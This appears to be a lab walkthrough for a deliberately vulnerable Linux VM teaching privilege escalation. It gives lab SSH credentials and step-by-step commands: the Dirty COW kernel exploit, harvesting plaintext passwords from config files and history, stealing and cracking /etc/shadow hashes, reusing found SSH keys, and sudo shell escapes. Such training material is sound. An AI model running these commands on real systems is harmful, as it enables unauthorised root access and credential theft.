<img src = https://i.imgur.com/5pWQzP0.png>

# Linux PrivEsc Arena


## ssh 

```
username: TCM
password: Hacker123
```

## 1. Kernel Exploits 


**Detection**

Linux VM

1. In command prompt type:
```/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh ```
2. From the output, notice that the OS is vulnerable to “dirtycow”.

**Exploitation**

Linux VM

1. In command prompt type:
```gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w ```
2. In command prompt type: ```./c0w ```

*Disclaimer: This part takes 1-2 minutes - Please allow it some time to work.*

3. In command prompt type: ```passwd ```
4. In command prompt type: ```id ```

From here, either copy /tmp/passwd back to /usr/bin/passwd or reset your machine to undo changes made to the passwd binary


## 2. Stored Passwords (Config Files) 

**Exploitation**

Linux VM

1. In command prompt type: ```cat /home/user/myvpn.ovpn ```
2. From the output, make note of the value of the “auth-user-pass” directive.
3. In command prompt type: ```cat /etc/openvpn/auth.txt ```
4. From the output, make note of the clear-text credentials.
5. In command prompt type: ```cat /home/user/.irssi/config | grep -i passw ```
6. From the output, make note of the clear-text credentials.

## 3.  Stored Passwords (History)

**Exploitation**

Linux VM
1. In command prompt type: ```cat ~/.bash_history | grep -i passw ```
2. From the output, make note of the clear-text credentials.



## 4. Weak File Permissions 

Linux VM

1. In command prompt type: ```cat /etc/passwd ```
2. Save the output to a file on your attacker machine
3. In command prompt type: ```cat /etc/shadow ```
4. Save the output to a file on your attacker machine

Attacker VM

1. In command prompt type: ```unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt ```

Now, you have an unshadowed file.  We already know the password, but you can use your favorite hash cracking tool to crack dem hashes.  For example:

```hashcat -m 1800 unshadowed.txt rockyou.txt -O ```

## 5. SSH Keys 

**Detection**

Linux VM

1. In command prompt type:
```find / -name authorized_keys 2> /dev/null ```
2. In a command prompt type:
```find / -name id_rsa 2> /dev/null ```
3. Note the results.

Exploitation

Linux VM

1. Copy the contents of the discovered id_rsa file to a file on your attacker VM.

Attacker VM

1. In command prompt type: ```chmod 400 id_rsa ```
2. In command prompt type: ```ssh -i id_rsa root@<ip> ```

You should now have a root shell :)

## 6. Sudo (Shell Escaping) 

**Detection**

Linux VM

1. In command prompt type: ``sudo -l ```
2. From the output, notice the list of programs that can run via sudo.

**Exploitation**

Linux VM

1. In command prompt type any of the following:
a. ```sudo find /bin -name nano -exec /bin/sh \; ```
b. ```sudo awk 'BEGIN {system("/bin/sh")}' ```
c. ```echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse ```
d. ```sudo vim -c '!sh' ```



## 7. Sudo (Abusing Intended Functionality)

**Detection**

Linux VM

1. In command prompt type: ```sudo -l ```
2. From the output, notice the list of programs that can run via sudo.

**Exploitation**

Linux VM

1. In command prompt type:
```sudo apache2 -f /etc/shadow ```
2. From the output, copy the root hash.

Attacker VM

1. Open command prompt and type:
```echo '[Pasted Root Hash]' > hash.txt ```
2. In command prompt type:
```john --wordlist=/usr/share/wordlists/nmap.lst hash.txt ```
3. From the output, notice the cracked credentials.


































